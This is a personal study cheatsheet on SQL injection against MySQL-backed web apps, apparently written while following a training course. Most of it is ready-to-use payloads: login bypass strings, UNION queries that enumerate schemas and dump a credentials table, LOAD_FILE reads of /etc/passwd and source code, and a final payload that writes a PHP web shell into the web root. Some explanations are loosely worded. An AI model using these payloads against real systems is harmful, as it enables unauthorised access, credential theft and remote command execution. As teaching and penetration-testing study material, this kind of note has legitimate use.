Skipping the whole part about databases ecc...
Cheatsheet is pretty straight-forward.

# SQL Injections
|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
## Authentication bypass
When there is a login form, we can try to bypass it by reverting the logic. a SQL query for a login looks like this:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

What we can do is modify one of the 'username' or 'password' field. One thing to keep in mind is the formatted structure of the query, in the case we just input strings, it means that the ' ' are prefixed to the request, so we need to remember it. 
What we can do is do a 'OR injection' like this:

Code: sql

```sql
admin' or '1'='1
```

This, in our final SQL query, look like this:

```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password = 'p@ssw0rd';
```

This works because 'AND' operator has more priority over the 'OR' operator. So the query first cheks the 'AND' with ('1'='1'), which is true, with (password='p@ssword'), which may be true, but most likey will be false, so final result will be false. In case that there's an username 'admin', our 'OR' operator, with 'true' and 'false', will output true, so we will have a succesful login. We can do the same for 'username' and 'password' by just using `' or '1' = '1`.

```sql
SELECT * FROM logins WHERE username='' OR '1'='1' AND password = '' OR '1'='1';
```

This will work anyway since we do not need to provide a working username, still i don't know from whom user we log in.
A good resource for auth bypass payload is this: [Auth bypass payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)


## Using comments
By using comments we can modify the query logic:
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
In this example, like obsidian formattes, whatever comes after 'admin'-- will not be evaluated. So if the user 'admin' is a working one, we will be logged-in without providing a password. This will also work if for example the query has multiple checks, like this:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '<hash>';-
```

In this case, 'id=1' is probably admin ID so we could never login as admin, what we can do is comment whatever come after the username, so the final query will be like:

```sql
SELECT * FROM logins where (username='admin')
```

SQL payload is `admin'--`

## Union clause
in MySQL we can do two query in a row, divided by a `;` semicolon, but we can use the UNION clause:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

What it does is the mathematical "union", so it will output both the SELECT statements.
But there's a problem, in case that we make a SELECT statement from different tables. In that case, tables could have different columns, and the UNION query could fail. What we need to do is enumerate the column we are interested.
We can do that with two techniques:
- Using `ORDER BY`
- Using `UNION`
By using `ORDER BY`, we can just enumerate like this:

```sql
' order by 1-- -
```

and keep going, with 2, 3, 4, ecc... since we do not receive an error.
(Ex: 'Unknown column "5" in "order clause"').
We can do similarly by using `UNION`: 
```sql
cn' UNION select 1,2,3-- -
```

then

```sql
cn' UNION select 1,2,3,4-- -
```

and so on. Once we know the number of columns, we can do query like this:
```sql
cn' UNION select 1,@@version,3,4-- -
```

# Exploitation

## Database enumeration
We can get information about the DB using the 'INFORMATION_SCHEMA' database. It contains metadata about databases, tables, columns, privileges and so on.  

This will enumerate databases:
```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

In case of a UNION injection, it will look similarly like this:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

This will enumerate the current database:
```sql
cn' UNION select 1,database(),2,3-- -
```

This is used for tables enumeration (need to specify a DB in the 'table_schema'):
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

This is used for columns enumeration (need to specify a table in the 'table_name'):
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Once we know the tables (for ex: 'username' and 'password') we can dump the data like this:
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

## Reading files
We can read files, but first we need to enumerate our privileges. Thes are some select clauses we can use to do so:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

In case we have 'root@localhost', it's a promising user.

We can enumerate user privileges like this:
```sql
SELECT super_priv FROM mysql.user
```
An example of full query (using UNION clause):
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

Other privileges enumeration:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

In order to read files, we need the 'FILE' privilege (also the SELECT one iirc). To read files, we can use this comand:
```sql
SELECT LOAD_FILE('/etc/passwd');
```
with UNION injection:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

we can also read source code with this technique:
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

## Writing files
To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

The first one can be checked with the previous commands, the second one can be checked whit this command:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

If value is empty, it means we can read/write files to any location. Otherwise, if a directory is settled, we can only write in the specified one.
For the third one, usually the web app will be hosted by 'www-data' user, and i think it usually has privs over the root directory of the webapp in the OS. For apache for example, it is '/var/www/html' directory. 

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

The UNION injection payload would be like this:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

We can also write a simple webshell in php:
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```






